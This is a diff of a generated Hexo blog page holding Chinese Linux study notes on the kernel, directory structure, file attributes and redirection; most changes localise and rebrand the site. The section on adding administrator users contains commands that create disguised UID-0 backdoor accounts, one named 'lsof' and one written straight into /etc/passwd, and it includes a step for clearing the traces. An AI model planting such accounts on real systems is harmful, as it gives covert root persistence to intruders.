@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -17,23 +17,23 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="linux学习一：linux概述1：组成部分内核，shell，文件系统，应用程序 内核： Linux 内核由以下 几部分 组成：内存管理器、进程管理器、设备驱动程序、虚拟文件系统（Virtual  File System， VFS）和网络管理等 文件系统： Linux 具有“一切皆文件”的特点。文件系统是文件存放在磁盘等存储设备上的 组织方法。Linux 系统支持目前流行的多种文件系统，如 EXT">
+  <meta name="description" content="linux学习笔记">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/2022/03/04/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="linux学习一：linux概述1：组成部分内核，shell，文件系统，应用程序 内核： Linux 内核由以下 几部分 组成：内存管理器、进程管理器、设备驱动程序、虚拟文件系统（Virtual  File System， VFS）和网络管理等 文件系统： Linux 具有“一切皆文件”的特点。文件系统是文件存放在磁盘等存储设备上的 组织方法。Linux 系统支持目前流行的多种文件系统，如 EXT">
-<meta property="og:locale" content="en_US">
+<meta property="og:title" content="linux学习">
+<meta property="og:url" content="https://apsry.github.io/2022/03/04/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="apsry">
+<meta property="og:description" content="linux学习笔记">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211125212944902.png">
 <meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211125213832286.png">
 <meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211125213629449.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200727215612903.png">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/228680-3929a10a52901187.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/228680-eb5e50607bf72e52.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/675/format/webp">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/228680-92ad761516389d11.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203041543688.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203041544205.jpg">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203041545227.jpeg">
 <meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211126103230735.png">
 <meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211126103255737.png">
 <meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211126103622641.png">
@@ -170,13 +170,14 @@
 <meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211126232904833.png">
 <meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211126233012424.png">
 <meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211126233032098.png">
-<meta property="article:published_time" content="2022-03-04T02:55:20.719Z">
-<meta property="article:modified_time" content="2021-12-07T13:38:13.519Z">
-<meta property="article:author" content="John Doe">
+<meta property="article:published_time" content="2022-03-04T07:23:00.000Z">
+<meta property="article:modified_time" content="2022-03-04T07:46:03.794Z">
+<meta property="article:author" content="apsry">
+<meta property="article:tag" content="linux">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211125212944902.png">
 
-<link rel="canonical" href="http://example.com/2022/03/04/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+<link rel="canonical" href="https://apsry.github.io/2022/03/04/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
 
 
 <script id="page-configurations">
@@ -185,11 +186,11 @@
     sidebar: "",
     isHome : false,
     isPost : true,
-    lang   : 'en'
+    lang   : 'zh-CN'
   };
 </script>
 
-  <title> | Hexo</title>
+  <title>linux学习 | apsry</title>
   
 
 
@@ -221,6 +222,9 @@
 </noscript>
 
 </head>
+<!-- 引入目录截取js -->
+<script type="text/javascript" src="/js/src/abstract.js"></script>
+
 
 <body itemscope itemtype="http://schema.org/WebPage">
   <div class="container use-motion">
@@ -229,7 +233,7 @@
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
+    <div class="toggle" aria-label="切换导航栏">
       <span class="toggle-line toggle-line-first"></span>
       <span class="toggle-line toggle-line-middle"></span>
       <span class="toggle-line toggle-line-last"></span>
@@ -240,9 +244,10 @@
 
     <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Hexo</h1>
+      <h1 class="site-title">apsry</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
+      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
   </div>
 
   <div class="site-nav-right">
@@ -258,12 +263,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
   </ul>
@@ -293,21 +313,21 @@
     
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/04/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/03/04/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="apsry">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="apsry">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          
+          linux学习
         </h1>
 
         <div class="post-meta">
@@ -315,17 +335,20 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-calendar"></i>
               </span>
-              <span class="post-meta-item-text">Posted on</span>
+              <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="Created: 2022-03-04 10:55:20" itemprop="dateCreated datePublished" datetime="2022-03-04T10:55:20+08:00">2022-03-04</time>
+              <time title="创建时间：2022-03-04 15:23:00 / 修改时间：15:46:03" itemprop="dateCreated datePublished" datetime="2022-03-04T15:23:00+08:00">2022-03-04</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-12-07 21:38:13" itemprop="dateModified" datetime="2021-12-07T21:38:13+08:00">2021-12-07</time>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
               </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
+                </span>
+            </span>
 
           
 
@@ -338,7 +361,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="linux学习"><a href="#linux学习" class="headerlink" title="linux学习"></a>linux学习</h1><h2 id="一：linux概述"><a href="#一：linux概述" class="headerlink" title="一：linux概述"></a>一：linux概述</h2><h3 id="1：组成部分"><a href="#1：组成部分" class="headerlink" title="1：组成部分"></a>1：组成部分</h3><p>内核，shell，文件系统，应用程序</p>
+        <p>linux学习笔记</p>
+<span id="more"></span>
+
+<h1 id="linux学习"><a href="#linux学习" class="headerlink" title="linux学习"></a>linux学习</h1><h2 id="一：linux概述"><a href="#一：linux概述" class="headerlink" title="一：linux概述"></a>一：linux概述</h2><h3 id="1：组成部分"><a href="#1：组成部分" class="headerlink" title="1：组成部分"></a>1：组成部分</h3><p>内核，shell，文件系统，应用程序</p>
 <p>内核：</p>
 <p>Linux 内核由以下 几部分 组成：内存管理器、进程管理器、设备驱动程序、虚拟文件系统（Virtual  File System， VFS）和网络管理等</p>
 <p>文件系统：</p>
@@ -378,10 +404,10 @@
 <h2 id="三：linux文件系统与磁盘管理"><a href="#三：linux文件系统与磁盘管理" class="headerlink" title="三：linux文件系统与磁盘管理"></a>三：linux文件系统与磁盘管理</h2><h3 id="1：思维导图"><a href="#1：思维导图" class="headerlink" title="1：思维导图"></a>1：思维导图</h3><p>1）：</p>
 <p><img src="https://img-blog.csdnimg.cn/20200727215612903.png" alt="img"></p>
 <p>2):</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/228680-3929a10a52901187.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/228680-eb5e50607bf72e52.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/675/format/webp" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203041543688.png" alt="1 (2)"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203041544205.jpg" alt="2"></p>
 <p>命令参考</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/228680-92ad761516389d11.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203041545227.jpeg" alt="img"></p>
 <h3 id="2：目录结构"><a href="#2：目录结构" class="headerlink" title="2：目录结构"></a>2：目录结构</h3><h4 id="1）-x2F"><a href="#1）-x2F" class="headerlink" title="1）&#x2F;"></a>1）&#x2F;</h4><p>根目录，超级用户主目录</p>
 <h4 id="2）-x2F-dev"><a href="#2）-x2F-dev" class="headerlink" title="2）&#x2F;dev"></a>2）&#x2F;dev</h4><p>device缩写，保存所有和设备相关的文件。</p>
 <h4 id="3）-x2F-boot"><a href="#3）-x2F-boot" class="headerlink" title="3）&#x2F;boot"></a>3）&#x2F;boot</h4><p>引导文件，放置开机需要用到的系统内核文件和引导转载文件</p>
@@ -493,9 +519,9 @@
 <h3 id="7：文件属性控制"><a href="#7：文件属性控制" class="headerlink" title="7：文件属性控制"></a>7：文件属性控制</h3><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211126132543782.png" alt="image-20211126132543782"></p>
 <p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211126132550238.png" alt="image-20211126132550238"></p>
 <h3 id="8：添加管理员用户"><a href="#8：添加管理员用户" class="headerlink" title="8：添加管理员用户"></a>8：添加管理员用户</h3><p>一条命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">useradd -p `openssl passwd -1 -salt ‘lsof’ admin` -u 0 -o -g root -G root -s /bin/bash -d /usr/bin/lsof lsof</span><br><span class="line"></span><br><span class="line">命令解释</span><br><span class="line"></span><br><span class="line">useradd 添加用户</span><br><span class="line"></span><br><span class="line">-p `openssl passwd -1 -salt ‘lsof’ admin` 这个里面的指的是设置用户的密码，里面的lsof差不多是密钥之类的，可以随便写， admin是明文密码</span><br><span class="line"></span><br><span class="line">-u 0 -o 添加一个uid为 0的用户 就相对于root级别的了</span><br><span class="line">-g root -G root 将用户添加到root组</span><br><span class="line">-s /bin/bash 指定新建用户的shell路径</span><br><span class="line">-d /usr/bin/lsof 新建用户的主目录，可以自己定义</span><br><span class="line">lsof 新建的用户的用户名</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">useradd -p `openssl passwd -<span class="number">1</span> -salt ‘lsof’ admin` -u <span class="number">0</span> -o -g root -G root -s <span class="regexp">/bin/</span>bash -d <span class="regexp">/usr/</span>bin/lsof lsof</span><br><span class="line"></span><br><span class="line">命令解释</span><br><span class="line"></span><br><span class="line">useradd 添加用户</span><br><span class="line"></span><br><span class="line">-p `openssl passwd -<span class="number">1</span> -salt ‘lsof’ admin` 这个里面的指的是设置用户的密码，里面的lsof差不多是密钥之类的，可以随便写， admin是明文密码</span><br><span class="line"></span><br><span class="line">-u <span class="number">0</span> -o 添加一个uid为 <span class="number">0</span>的用户 就相对于root级别的了</span><br><span class="line">-g root -G root 将用户添加到root组</span><br><span class="line">-s <span class="regexp">/bin/</span>bash 指定新建用户的shell路径</span><br><span class="line">-d <span class="regexp">/usr/</span>bin/lsof 新建用户的主目录，可以自己定义</span><br><span class="line">lsof 新建的用户的用户名</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">添加账号</span><br><span class="line">一般在具有root权限时可以使用以下2种方式添加root权限用户</span><br><span class="line"></span><br><span class="line">1.通过useradd，后面账号backdoor/123456</span><br><span class="line"></span><br><span class="line">useradd -u 0 -o -g root -G root backdoor</span><br><span class="line"></span><br><span class="line">echo 123456:password|chpasswd</span><br><span class="line">2.通过直接对etc/passwd文件进行写入</span><br><span class="line"></span><br><span class="line">perl -e &#x27;print crypt(&quot;123456&quot;, &quot;AA&quot;). &quot;\n&quot;&#x27; #首先用perl算一下123456加密后的结果</span><br><span class="line"></span><br><span class="line"># 123456加密后的结果为AASwmzPNx.3sg</span><br><span class="line"></span><br><span class="line">echo &quot;backdoor:123456:0:0:me:/root:/bin/bash&quot;&gt;&gt;/etc/passwd	#直接写入etc/passwd中</span><br><span class="line">清理以上痕迹</span><br><span class="line"></span><br><span class="line">userdel -f backdoor</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">添加账号</span><br><span class="line">一般在具有root权限时可以使用以下2种方式添加root权限用户</span><br><span class="line"></span><br><span class="line">1.通过useradd，后面账号backdoor/123456</span><br><span class="line"></span><br><span class="line">useradd -u 0 -o -g root -G root backdoor</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 123456:password|chpasswd</span><br><span class="line">2.通过直接对etc/passwd文件进行写入</span><br><span class="line"></span><br><span class="line">perl -e <span class="string">&#x27;print crypt(&quot;123456&quot;, &quot;AA&quot;). &quot;\n&quot;&#x27;</span> <span class="comment">#首先用perl算一下123456加密后的结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 123456加密后的结果为AASwmzPNx.3sg</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;backdoor:123456:0:0:me:/root:/bin/bash&quot;</span>&gt;&gt;/etc/passwd	<span class="comment">#直接写入etc/passwd中</span></span><br><span class="line">清理以上痕迹</span><br><span class="line"></span><br><span class="line">userdel -f backdoor</span><br></pre></td></tr></table></figure>
 
 
 
@@ -525,7 +551,7 @@
 <h3 id="1：命令行数据流"><a href="#1：命令行数据流" class="headerlink" title="1：命令行数据流"></a>1：命令行数据流</h3><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211126184726973.png" alt="image-20211126184726973"></p>
 <h3 id="2：重定向输入-gt"><a href="#2：重定向输入-gt" class="headerlink" title="2：重定向输入 &gt;"></a>2：重定向输入 &gt;</h3><p>用 &gt; 重定向输入到文件</p>
 <p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20211126184830585.png" alt="image-20211126184830585"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;会覆盖输入。&gt;&gt; 则是在后面添加输入内容</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="language-bash">会覆盖输入。&gt;&gt; 则是在后面添加输入内容</span></span><br></pre></td></tr></table></figure>
 
 
 
@@ -621,18 +647,14 @@
     
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/linux/" rel="tag"># linux</a>
+          </div>
 
         
 
 
         
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2022/03/04/hello-world/" rel="prev" title="Hello World">
-      <i class="fa fa-chevron-left"></i> Hello World
-    </a></div>
-      <div class="post-nav-item"></div>
-    </div>
       </footer>
     
   </article>
@@ -681,10 +703,10 @@
 
       <ul class="sidebar-nav motion-element">
         <li class="sidebar-nav-toc">
-          Table of Contents
+          文章目录
         </li>
         <li class="sidebar-nav-overview">
-          Overview
+          站点概览
         </li>
       </ul>
 
@@ -696,7 +718,7 @@
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">John Doe</p>
+  <p class="site-author-name" itemprop="name">apsry</p>
   <div class="site-description" itemprop="description"></div>
 </div>
 <div class="site-state-wrap motion-element">
@@ -704,9 +726,17 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">2</span>
-          <span class="site-state-item-name">posts</span>
+          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-name">日志</span>
         </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
       </div>
   </nav>
 </div>
@@ -736,9 +766,9 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+  <span class="author" itemprop="copyrightHolder">apsry</span>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
 
         
